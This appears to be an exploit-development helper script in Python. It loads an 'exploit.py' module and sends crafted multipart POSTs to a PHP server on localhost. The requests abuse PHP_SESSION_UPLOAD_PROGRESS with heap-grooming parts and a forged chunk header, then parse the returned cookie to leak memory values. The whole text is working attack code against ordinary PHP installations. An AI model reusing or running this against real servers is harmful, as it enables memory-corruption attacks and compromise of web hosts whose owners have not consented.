import importlib.util, struct, time, collections, binascii
spec = importlib.util.spec_from_file_location("p2s", "exploit.py"); m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
t = m.Target("http://127.0.0.1:8088/index.php", timeout=90, verbose=False)
parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
parts += [{"name":"PHPSESSID","data":b"\x00"},{"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"},
          {"name":"f","filename":"a.txt","data":b"A"*64},{"name":"big","data":b"B"*(12*1024*1024)}]
t.post(m.build_multipart(parts,b"S"*17), b"S"*17, read_cap=1<<20, timeout=90); time.sleep(0.2)
p2=[{"name":"PHPSESSID","data":m.SID},{"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"}]
for i in range(m.BOOKWORM_STAGE1_N):
    p2.append({"name":str(1000+i),"data":(f"v{i:04d}"+"x"*44)[:48].encode()})
f=bytearray(b"A"*79); struct.pack_into("<Q",f,0x10,0x1000); f[0x18]=ord("L")
p2.append({"name":"1999","data":bytes(f)})
r=t.post(m.build_multipart(p2,b"B"*10),b"B"*10,read_cap=9<<20)
ck=m.parse_cookie(r)
print("len",len(ck)); print("hex128",binascii.hexlify(ck[:128]).decode())
print("nonzero_bytes",sum(1 for b in ck if b))
rng=collections.Counter()
for i in range(len(ck)-8):
    v=int.from_bytes(ck[i:i+8],"little")
    rng[(v>>40)&0xff]+=1
print("top byte of qwords:", rng.most_common(6))
